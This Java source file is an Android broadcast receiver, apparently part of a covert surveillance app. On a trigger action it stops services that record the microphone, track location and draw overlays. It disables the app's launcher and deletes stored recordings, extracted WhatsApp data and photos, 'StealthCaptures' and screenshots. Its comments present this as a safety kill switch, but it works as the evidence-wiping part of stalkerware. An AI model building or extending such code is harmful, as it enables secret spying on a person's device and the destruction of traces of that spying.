package com.anti.rootadbcontroller.services;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.util.Log;

import com.anti.rootadbcontroller.MainActivity;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * A BroadcastReceiver that acts as a kill switch for the application. When triggered,
 * it disables the main activity, stops all running services, and cleans up any data
 * collected by the app. This is designed as a safety measure to ensure the app
 * does not remain active indefinitely.
 */
public class KillSwitchReceiver extends BroadcastReceiver {
    private static final String TAG = "KillSwitchReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Kill switch triggered. Verifying and disabling app components.");

        // Verify this is a legitimate kill switch trigger
        // In a real app, you might want to check for a specific action or extra data
        // For example, you could require a secret key or check the sender's identity
        if (intent != null && intent.getAction() != null) {
            if (intent.getAction().equals("com.anti.rootadbcontroller.KILL_SWITCH")) {
                Log.d(TAG, "Kill switch verification passed. Proceeding with cleanup.");

                // 1. Wipe collected data (using safer cleanup method)
                safeCleanup(context);

                // 2. Disable the main launcher activity
                PackageManager pm = context.getPackageManager();
                ComponentName componentName = new ComponentName(context, MainActivity.class);
                pm.setComponentEnabledSetting(componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);

                // 3. Stop any running services
                context.stopService(new Intent(context, MicRecorderService.class));
                context.stopService(new Intent(context, LocationTrackerService.class));
                context.stopService(new Intent(context, OverlayService.class));

                Log.d(TAG, "Kill switch procedures completed.");
            } else {
                Log.w(TAG, "Kill switch triggered with incorrect action: " + intent.getAction());
            }
        } else {
            Log.w(TAG, "Kill switch triggered with null intent or action.");
        }
    }

    /**
     * Safely cleans up files and directories created by the application.
     * This includes recordings, extracted data, and screenshots, but avoids
     * dangerous operations that could affect system stability.
     * @param context The context from which the cleanup is initiated.
     */
    private void safeCleanup(Context context) {
        Log.d(TAG, "Safely cleaning up collected data...");

        try {
            // Clean up app-specific external storage files
            cleanupExternalStorageFiles(context);

            // Clean up app's cache directory
            File cacheDir = context.getCacheDir();
            if (cacheDir != null && cacheDir.exists()) {
                deleteRecursively(cacheDir);
                Log.d(TAG, "Cache directory cleaned");
            }

            // Clean up app's external cache directory
            File externalCacheDir = context.getExternalCacheDir();
            if (externalCacheDir != null && externalCacheDir.exists()) {
                deleteRecursively(externalCacheDir);
                Log.d(TAG, "External cache directory cleaned");
            }

            // Clear app's database files if needed
            // This is safer than using "pm clear" which can cause issues
            File databaseDir = new File(context.getApplicationInfo().dataDir, "databases");
            if (databaseDir.exists()) {
                File[] databases = databaseDir.listFiles();
                if (databases != null) {
                    for (File db : databases) {
                        if (!db.getName().contains("essential")) { // Skip essential databases
                            db.delete();
                        }
                    }
                }
                Log.d(TAG, "Database files cleaned");
            }

            Log.d(TAG, "Safe cleanup completed successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error during safe cleanup", e);
        }
    }

    /**
     * Cleans up files created by the app in external storage
     */
    private void cleanupExternalStorageFiles(Context context) {
        try {
            // Get base directories
            File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File picturesDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);

            // Clean up app-generated directories
            deleteIfExists(new File(downloadsDir, "Recordings"));
            deleteIfExists(new File(downloadsDir, "extracted_photos"));
            deleteIfExists(new File(downloadsDir, "extracted_whatsapp"));
            deleteIfExists(new File(downloadsDir, "StealthCaptures"));

            // Clean up app-generated files
            deleteMatchingFiles(downloadsDir, "extracted_", ".txt");
            deleteMatchingFiles(picturesDir, "screenshot_", ".png");

            Log.d(TAG, "External storage files cleaned");
        } catch (Exception e) {
            Log.e(TAG, "Error cleaning external storage files", e);
        }
    }

    /**
     * Deletes a file or directory if it exists
     */
    private void deleteIfExists(File file) {
        if (file != null && file.exists()) {
            if (file.isDirectory()) {
                deleteRecursively(file);
            } else {
                file.delete();
            }
            Log.d(TAG, "Deleted: " + file.getAbsolutePath());
        }
    }

    /**
     * Deletes files in a directory that match a prefix and suffix pattern
     */
    private void deleteMatchingFiles(File directory, String prefix, String suffix) {
        if (directory != null && directory.exists() && directory.isDirectory()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    String name = file.getName();
                    if (name.startsWith(prefix) && name.endsWith(suffix)) {
                        file.delete();
                        Log.d(TAG, "Deleted matching file: " + file.getAbsolutePath());
                    }
                }
            }
        }
    }

    /**
     * Optional method to request app uninstallation
     * This is a safer alternative to the previous self-destruct method
     * and requires user confirmation
     */
    private void requestUninstall(Context context) {
        try {
            // Create an intent to open the app details in system settings
            // This allows the user to manually uninstall the app if desired
            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            Log.d(TAG, "Requested app uninstall via system settings");
        } catch (Exception e) {
            Log.e(TAG, "Error requesting uninstall", e);
        }
    }

    /**
     * Fallback cleanup for when the main cleanup fails
     * This is a safer version of the previous basicCleanup method
     */
    private void fallbackCleanup(Context context) {
        try {
            // Clear app's cache data only (not all private data)
            File cacheDir = context.getCacheDir();
            if (cacheDir != null && cacheDir.exists()) {
                deleteRecursively(cacheDir);
            }

            // Clear external cache files
            File externalCacheDir = context.getExternalCacheDir();
            if (externalCacheDir != null) {
                deleteRecursively(externalCacheDir);
            }

            Log.d(TAG, "Fallback cleanup completed");
        } catch (Exception e) {
            Log.e(TAG, "Fallback cleanup failed", e);
        }
    }

    /**
     * Recursively delete directory and its contents
     */
    private void deleteRecursively(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursively(child);
                }
            }
        }
        file.delete();
    }
}
